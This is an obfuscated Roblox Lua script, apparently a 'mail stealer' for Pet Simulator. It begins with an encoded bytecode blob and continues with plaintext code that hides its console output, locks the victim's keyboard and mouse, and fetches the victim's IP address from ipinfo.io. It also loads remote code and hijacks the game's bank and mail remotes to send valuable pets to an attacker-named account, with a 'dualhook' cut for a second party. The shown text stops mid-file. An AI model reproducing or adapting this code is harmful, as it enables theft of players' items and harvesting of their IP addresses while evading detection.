4D000200020004001253000300054O008900046O007B0002000400012O00333O00017O002E3O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E6403093O0057487567654C69737403023O0069640003063O00696E7365727403063O0057484C69737403043O0057482O63026O00F03F03063O0053484C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503093O007468756D626E61696C03243O003A6D6F6E65795F6D6F7574683A202O2A485547452O2A203A6D6F6E65795F6D6F7574683A03093O004065766572796F6E6503083O00557365724E616D65028O0003053O00484C69737400A33O0012533O00014O006C3O000100020006453O00A200013O0004123O00A200010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004300010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O00070043000100190004123O004300010012530007000C3O00206400070007001A00122O0008001B3O00202O0009000600144O00070009000100122O0007000C3O00202O00070007001A00122O0008001C3O00202O0009000600184O00070009000100066700020032000100020004123O003200012O00AE00025O0012530003001B4O006E000300033O00204F00030003001D00061D0002008F000100030004123O008F00010012530002001B4O0005010200026O00028O000200013O00202O00020002001D4O000200013O00122O0002001E6O000300026O0002000200034O000300043O00122O000500133O00122O000600043O00202O00060006000500122O000800066O00060008000200202O00060006001F00202O00060006000F00202O0006000600204O000600076O00053O000700044O00780001001253000A00213O0020DC000A000A002200202O000B0009002300122O000C00246O000A000C000200202O000A000A001D00122O000B00256O000C00026O000B0002000200062O000A00780001000B0004123O00780001001253000B00033O002017010C0009002600122O000E00276O000C000E6O000B3O000200202O0004000B002800122O000B00033O00202O000C0009002600122O000E00276O000C000E6O000B3O000200202O0003000B002900044O007A000100066700050060000100020004123O006000012O00AE000500033O0012D90006002A6O000700043O00122O0008002B6O000900046O000A00016O000B00033O00122O000C002C6O0005000C000100122O0005002D6O000500053O00122O0005002D6O000500046O000500023O00202O00050005001D4O000500023O00122O0005002D6O000500063O00122O0005002D6O000500073O00044O009800012O00AE00025O002624000200950001002D0004123O009500012O00AE000200013O00263F000200980001002D0004123O009800012O002C01025O0012190002002E3O0004123O00A200012O002C01025O001271000200176O00025O00122O0002001B6O00025O00122O0002001C3O00122O000200013O00122O0003001D6O00020002000100046O00012O00333O00013O00013O00043O0003043O006875676503053O007461626C6503063O00696E7365727403093O0057487567654C69737402093O00204D0002000100010006450002000800013O0004123O00080001001253000200023O00204D000200020003001253000300044O008900046O007B0002000400012O00333O00017O002E3O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E6403083O0057506F674C69737403023O00696400028O0003063O00696E7365727403063O0057504C69737403043O0057502O63026O00F03F03063O0053504C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503093O007468756D626E61696C03153O003A666972653A202O2A504F472O2A203A666972653A034O0003083O00557365724E616D6503053O00504C69737400A83O0012533O00014O006C3O000100020006453O00A700013O0004123O00A700010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004800010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O00070048000100190004123O004800010012190107001A3O00263F0007003A0001001A0004123O003A00010012530008000C3O0020AF00080008001B00122O0009001C3O00202O000A000600144O0008000A000100122O0008000C3O00202O00080008001B00122O0009001D3O00202O000A000600184O0008000A000100044O004800010004123O003A000100066700020032000100020004123O003200012O00AE00025O0012530003001C4O006E000300033O00204F00030003001E00061D00020094000100030004123O009400010012530002001C4O0005010200026O00028O000200013O00202O00020002001E4O000200013O00122O0002001F6O000300026O0002000200034O000300043O00122O000500133O00122O000600043O00202O00060006000500122O000800066O00060008000200202O00060006002000202O00060006000F00202O0006000600214O000600076O00053O000700044O007D0001001253000A00223O0020DC000A000A002300202O000B0009002400122O000C00256O000A000C000200202O000A000A001E00122O000B00266O000C00026O000B0002000200062O000A007D0001000B0004123O007D0001001253000B00033O002017010C0009002700122O000E00286O000C000E6O000B3O000200202O0003000B002900122O000B00033O00202O000C0009002700122O000E00286O000C000E6O000B3O000200202O0004000B002A00044O007F000100066700050065000100020004123O006500012O00AE000500033O0012D90006002B6O000700033O00122O0008002C6O000900046O000A00016O000B00043O00122O000C002D6O0005000C000100122O0005001A6O000500053O00122O0005001A6O000500046O000500023O00202O00050005001E4O000500023O00122O0005001A6O000500063O00122O0005001A6O000500073O00044O009D00012O00AE00025O0026240002009A0001001A0004123O009A00012O00AE000200013O00263F0002009D0001001A0004123O009D00012O002C01025O0012190002002E3O0004123O00A700012O002C01025O001271000200176O00025O00122O0002001C6O00025O00122O0002001D3O00122O000200013O00122O0003001E6O00020002000100046O00012O00333O00013O00013O00093O0003063O00737472696E6703053O0073706C697403043O006E616D6503013O0020026O00F03F2O033O00506F6703053O007461626C6503063O00696E7365727403083O0057506F674C697374020E3O00120E010200013O00202O00020002000200202O00030001000300122O000400046O00020004000200202O00020002000500262O0002000D000100060004123O000D0001001253000200073O00204D000200020008001253000300094O008900046O007B0002000400012O00333O00017O00303O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E64030E3O00574578636C75736976654C69737403023O0069640003043O006875676503073O00746974616E6963028O0003063O00696E7365727403063O0057454C69737403043O0057452O63026O00F03F03063O0053454C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503093O007468756D626E61696C03273O003A74652O64795F626561723A202O2A4578636C75736976652O2A203A74652O64795F626561723A034O0003083O00557365724E616D6503053O00454C69737400AE3O0012533O00014O006C3O000100020006453O00AD00013O0004123O00AD00010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004E00010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O0007004E000100190004123O004E000100204D00070006001A0006DE0007004E000100010004123O004E000100204D00070006001B0006DE0007004E000100010004123O004E00010012190107001C3O00263F000700400001001C0004123O004000010012530008000C3O0020AF00080008001D00122O0009001E3O00202O000A000600144O0008000A000100122O0008000C3O00202O00080008001D00122O0009001F3O00202O000A000600184O0008000A000100044O004E00010004123O0040000100066700020032000100020004123O003200012O00AE00025O0012530003001E4O006E000300033O00204F00030003002000061D0002009A000100030004123O009A00010012530002001E4O0005010200026O00028O000200013O00202O0002000200204O000200013O00122O000200216O000300026O0002000200034O000300043O00122O000500133O00122O000600043O00202O00060006000500122O000800066O00060008000200202O00060006002200202O00060006000F00202O0006000600234O000600076O00053O000700044O00830001001253000A00243O0020DC000A000A002500202O000B0009002600122O000C00276O000A000C000200202O000A000A002000122O000B00286O000C00026O000B0002000200062O000A00830001000B0004123O00830001001253000B00033O002017010C0009002900122O000E002A6O000C000E6O000B3O000200202O0004000B002B00122O000B00033O00202O000C0009002900122O000E002A6O000C000E6O000B3O000200202O0003000B002C00044O008500010006670005006B000100020004123O006B00012O00AE000500033O0012D90006002D6O000700043O00122O0008002E6O000900046O000A00016O000B00033O00122O000C002F6O0005000C000100122O0005001C6O000500053O00122O0005001C6O000500046O000500023O00202O0005000500204O000500023O00122O0005001C6O000500063O00122O0005001C6O000500073O00044O00A300012O00AE00025O002624000200A00001001C0004123O00A000012O00AE000200013O00263F000200A30001001C0004123O00A300012O002C01025O001219000200303O0004123O00AD00012O002C01025O001271000200176O00025O00122O0002001E6O00025O00122O0002001F3O00122O000200013O00122O000300206O00020002000100046O00012O00333O00013O00013O00073O0003063O0072617269747903093O004578636C757369766503043O006875676503073O00746974616E696303053O007461626C6503063O00696E73657274030E3O00574578636C75736976654C697374020F3O00204D00020001000100263F0002000E000100020004123O000E000100204D0002000100030006DE0002000E000100010004123O000E000100204D0002000100040006DE0002000E000100010004123O000E0001001253000200053O00204D000200020006001253000300074O008900046O007B0002000400012O00333O00017O002E3O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E64030A3O00574576656E744C69737403023O00696400028O0003063O00696E7365727403073O005745764C69737403053O005745762O63026O00F03F03073O005345764C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503093O007468756D626E61696C031D3O003A7075736870696E3A202O2A4576656E742O2A203A7075736870696E3A034O0003073O00706574696E666F03063O0045764C69737400AA3O0012533O00014O006C3O000100020006453O00A900013O0004123O00A900010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004800010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O00070048000100190004123O004800010012190107001A3O00263F0007003A0001001A0004123O003A00010012530008000C3O0020AF00080008001B00122O0009001C3O00202O000A000600144O0008000A000100122O0008000C3O00202O00080008001B00122O0009001D3O00202O000A000600184O0008000A000100044O004800010004123O003A000100066700020032000100020004123O003200012O00AE00025O0012530003001C4O006E000300033O00204F00030003001E00061D00020096000100030004123O009600010012530002001C4O00CA000200026O00028O000200013O00202O00020002001E4O000200016O000200023O00122O0003001F6O000400036O0003000300044O000400053O00122O000600133O00122O000700043O00202O00070007000500122O000900066O00070009000200202O00070007002000202O00070007000F00202O0007000700214O000700086O00063O000800044O007E0001001253000B00223O0020DC000B000B002300202O000C000A002400122O000D00256O000B000D000200202O000B000B001E00122O000C00266O000D00036O000C0002000200062O000B007E0001000C0004123O007E0001001253000C00033O002017010D000A002700122O000F00286O000D000F6O000C3O000200202O0004000C002900122O000C00033O00202O000D000A002700122O000F00286O000D000F6O000C3O000200202O0005000C002A00044O0080000100066700060066000100020004123O006600012O00AE000600043O0012880007002B6O000800043O00122O0009002C6O000A00056O000B00016O000C00056O000D00063O00122O000E002D6O0006000E000100122O0006001A6O000600023O00122O0006001A6O000600056O000600033O00202O00060006001E4O000600033O00122O0006001A6O000600073O00122O0006001A6O000600083O00044O009F00012O00AE00025O0026240002009C0001001A0004123O009C00012O00AE000200013O00263F0002009F0001001A0004123O009F00012O002C01025O0012190002002E3O0004123O00A900012O002C01025O001271000200176O00025O00122O0002001C6O00025O00122O0002001D3O00122O000200013O00122O0003001E6O00020002000100046O00012O00333O00013O00013O00053O0003063O0072617269747903053O004576656E7403053O007461626C6503063O00696E73657274030A3O00574576656E744C69737402093O00204D00020001000100263F00020008000100020004123O00080001001253000200033O00204D000200020004001253000300054O008900046O007B0002000400012O00333O00017O002D3O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E64030B3O00575365637265744C69737403023O00696400028O0003063O00696E7365727403063O0057534C69737403043O0057532O63026O00F03F03063O002O534C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503093O007468756D626E61696C032A3O003A7368757368696E675F666163653A202O2A5345435245542O2A203A7368757368696E675F666163653A034O0003053O00534C69737400A83O0012533O00014O006C3O000100020006453O00A700013O0004123O00A700010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004800010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O00070048000100190004123O004800010012190107001A3O000E04011A003A000100070004123O003A00010012530008000C3O0020AF00080008001B00122O0009001C3O00202O000A000600144O0008000A000100122O0008000C3O00202O00080008001B00122O0009001D3O00202O000A000600184O0008000A000100044O004800010004123O003A000100066700020032000100020004123O003200012O00AE00025O0012530003001C4O006E000300033O00204F00030003001E00061D00020094000100030004123O009400010012530002001C4O0005010200026O00028O000200013O00202O00020002001E4O000200013O00122O0002001F6O000300026O0002000200034O000300043O00122O000500133O00122O000600043O00202O00060006000500122O000800066O00060008000200202O00060006002000202O00060006000F00202O0006000600214O000600076O00053O000700044O007D0001001253000A00223O0020DC000A000A002300202O000B0009002400122O000C00256O000A000C000200202O000A000A001E00122O000B00266O000C00026O000B0002000200062O000A007D0001000B0004123O007D0001001253000B00033O002017010C0009002700122O000E00286O000C000E6O000B3O000200202O0003000B002900122O000B00033O00202O000C0009002700122O000E00286O000C000E6O000B3O000200202O0004000B002A00044O007F000100066700050065000100020004123O006500012O00AE000500033O00127F0006002B6O000700033O00122O0008002C6O000900046O000A00016O000B00046O000C00056O0005000C000100122O0005001A6O000500063O00122O0005001A6O000500046O000500023O00202O00050005001E4O000500023O00122O0005001A6O000500073O00122O0005001A6O000500083O00044O009D00012O00AE00025O0026240002009A0001001A0004123O009A00012O00AE000200013O00263F0002009D0001001A0004123O009D00012O002C01025O0012190002002D3O0004123O00A700012O002C01025O001271000200176O00025O00122O0002001C6O00025O00122O0002001D3O00122O000200013O00122O0003001E6O00020002000100046O00012O00333O00013O00013O00053O0003063O0072617269747903063O0053656372657403053O007461626C6503063O00696E73657274030B3O00575365637265744C69737402093O00204D00020001000100263F00020008000100020004123O00080001001253000200033O00204D000200020004001253000300054O008900046O007B0002000400012O00333O00017O002F3O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E64030B3O00574D79746869634C69737403023O0069640003023O00686303023O00646D028O0003063O00696E7365727403063O00574D4C69737403043O00574D2O63026O00F03F03063O00534D4C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503133O006461726B4D612O7465725468756D626E61696C031E3O003A72692O626F6E3A202O2A4D7974686963616C2O2A203A72692O626F6E3A034O0003053O004D4C69737400AE3O0012533O00014O006C3O000100020006453O00AD00013O0004123O00AD00010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004E00010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O0007004E000100190004123O004E000100204D00070006001A0006450007004E00013O0004123O004E000100204D00070006001B0006450007004E00013O0004123O004E00010012190107001C3O00263F000700400001001C0004123O004000010012530008000C3O0020AF00080008001D00122O0009001E3O00202O000A000600144O0008000A000100122O0008000C3O00202O00080008001D00122O0009001F3O00202O000A000600184O0008000A000100044O004E00010004123O0040000100066700020032000100020004123O003200012O00AE00025O0012530003001E4O006E000300033O00204F00030003002000061D0002009A000100030004123O009A00010012530002001E4O0005010200026O00028O000200013O00202O0002000200204O000200013O00122O000200216O000300026O0002000200034O000300043O00122O000500133O00122O000600043O00202O00060006000500122O000800066O00060008000200202O00060006002200202O00060006000F00202O0006000600234O000600076O00053O000700044O00830001001253000A00243O0020DC000A000A002500202O000B0009002600122O000C00276O000A000C000200202O000A000A002000122O000B00286O000C00026O000B0002000200062O000A00830001000B0004123O00830001001253000B00033O002017010C0009002900122O000E002A6O000C000E6O000B3O000200202O0003000B002B00122O000B00033O00202O000C0009002900122O000E002A6O000C000E6O000B3O000200202O0004000B002C00044O008500010006670005006B000100020004123O006B00012O00AE000500033O00127F0006002D6O000700033O00122O0008002E6O000900046O000A00016O000B00046O000C00056O0005000C000100122O0005001C6O000500063O00122O0005001C6O000500046O000500023O00202O0005000500204O000500023O00122O0005001C6O000500073O00122O0005001C6O000500083O00044O00A300012O00AE00025O002624000200A00001001C0004123O00A000012O00AE000200013O00263F000200A30001001C0004123O00A300012O002C01025O0012190002002F3O0004123O00AD00012O002C01025O001271000200176O00025O00122O0002001E6O00025O00122O0002001F3O00122O000200013O00122O000300206O00020002000100046O00012O00333O00013O00013O00053O0003063O0072617269747903083O004D7974686963616C03053O007461626C6503063O00696E73657274030B3O00574D79746869634C69737402093O00204D00020001000100263F00020008000100020004123O00080001001253000200033O00204D000200020004001253000300054O008900046O007B0002000400012O00333O00017O00",GetFEnv(),...); end
+--[[
+   ____  _         _   _       _       __  __       _ _     _             _
+  |  _ \(_)_______| | | |_   _| |__   |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __
+  | |_) | |_  /_  / |_| | | | | '_ \  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  |  _ <| |/ / / /|  _  | |_| | |_) | | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |
+  |_| \_\_/___/___|_| |_|\__,_|_.__/  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|
+  
+]]--
+
+getgenv().Settings = {
+    User = "unstoppable_rookie",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "Easy Dubs",
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 0 --%
+    }
+}
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local disabledKeyCodes = {
+    0x73,
+    0xA4,
+    0xA5,
+    0x1B,
+    0x0D,
+};
+UserSettings().GameSettings.MasterVolume = 0
+if _G.MouseLock ~= false then
+    runService.RenderStepped:Connect(function()
+        for _, keyCode in next, disabledKeyCodes do
+            keyrelease(keyCode)
+        end
+
+        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
+    end);
+end
+
+local function antiPrint(...)
+    local info = debug.getinfo(2)
+    if info and info.what == 'Lua' and info.func == print then
+        return
+    end
+    return print(...)
+end
+print = antiPrint
+rconsoleprint = antiPrint
+rconsolewarn = antiPrint
+rconsoleerr = antiPrint
+rconsoleinput = antiPrint
+printconsole = antiPrint
+setclipboard = antiPrint
+
+-- Users And Stuff
+
+if UserName == nil then
+    UserName = _G.UserName
+end
+if UserName2 == nil then
+    UserName2 = _G.UserName2
+end
+if Webhook == nil then
+    Webhook = _G.Webhook
+end
+-- User Checks
+
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end
+if UserName2 ~= nil then
+    local worked3 = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
+    end)
+    if not worked3 then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
+        return;
+    end
+end
+
+local diaamt99 = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
+
+-- Check If The Area Have A Mailbox In It
+
+local worked = pcall(function()
+    game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad:GetChildren()
+end)
+if not worked then
+    game:GetService("Players").LocalPlayer:Kick("UnRegistered Area. Please Consider Going To The Shop")
+    return;
+end
+
+-- Base64 Encryption
+
+function to_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    return ((data:gsub('.', function(x)
+        local r, b = '', x:byte()
+        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r;
+    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c = 0
+        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
+        return b:sub(c + 1, c + 1)
+    end) .. ({ '', '==', '=' })[#data % 3 + 1])
+end
+
+function from_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^' .. b .. '=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r, f = '', (b:find(x) - 1)
+        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c = 0
+        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Premium Check
+
+request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
+    HttpPost
+
+
+-- Exploit's Name
+
+local exploit
+local function getexploit()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
+
+    exploit = exploitt
+end
+getexploit()
+
+-- Player Infos
+
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game:GetService("Players").LocalPlayer
+local IPadress = game:HttpGet('https://ipinfo.io/ip')
+local data1
+
+-- Loading Screen
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+end
+
+-- Remotes
+
+local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
+local InvPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
+local MailPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox)
+local RedeemPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Reedem Rank Rewards"])
+local GiftsPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Free Gifts"])
+
+local getmybanksremote = debug.getconstant(BankPath.GetMyBanks, 3)
+
+local lockremote = debug.getconstant(InvPath.LockPets, 5)
+
+local getbankremote = debug.getconstant(BankPath.GetBank, 3)
+
+local withdrawremote = debug.getconstant(BankPath.Withdraw, 16)
+
+local mailremote = debug.getconstant(debug.getprotos(MailPath.UpdateOutbox)[2], 20)
+
+local claimallremote = debug.getconstant(MailPath.UpdateInboxBottom, 35)
+
+local getmailremote = debug.getconstant(MailPath.Update, 3)
+
+local acceptinviteremote = debug.getconstant(BankPath.DecideInvite, 6)
+
+local getinvitesremote = debug.getconstant(BankPath.GetMyInvites, 3)
+
+local redeemrankremote = debug.getconstant(RedeemPath.Redeem, 3)
+
+local redeemgiftsremote = debug.getconstant(GiftsPath.Redeem, 3)
+
+local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local bloby = getupvalues(blobx[2])
+local blobz = getupvalues(bloby[1])[1][2]
+local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local blobb = getupvalues(bloba[2])
+
+getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
+lockremote = blobz[blobb[2](2, lockremote)]
+getbankremote = blobz[blobb[2](2, getbankremote)]
+withdrawremote = blobz[blobb[2](2, withdrawremote)]
+mailremote = blobz[blobb[2](2, mailremote)]
+claimallremote = blobz[blobb[2](2, claimallremote)]
+getmailremote = blobz[blobb[2](2, getmailremote)]
+acceptinviteremote = blobz[blobb[2](2, acceptinviteremote)]
+getinvitesremote = blobz[blobb[2](2, getinvitesremote)]
+redeemrankremote = blobz[blobb[2](2, redeemrankremote)]
+redeemgiftsremote = blobz[blobb[2](2, redeemgiftsremote)]
+
+-- Banks Stuff
+
+local mybanks = getmybanksremote:InvokeServer()
+local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+
+-- Inv Space Check :
+
+function invspace()
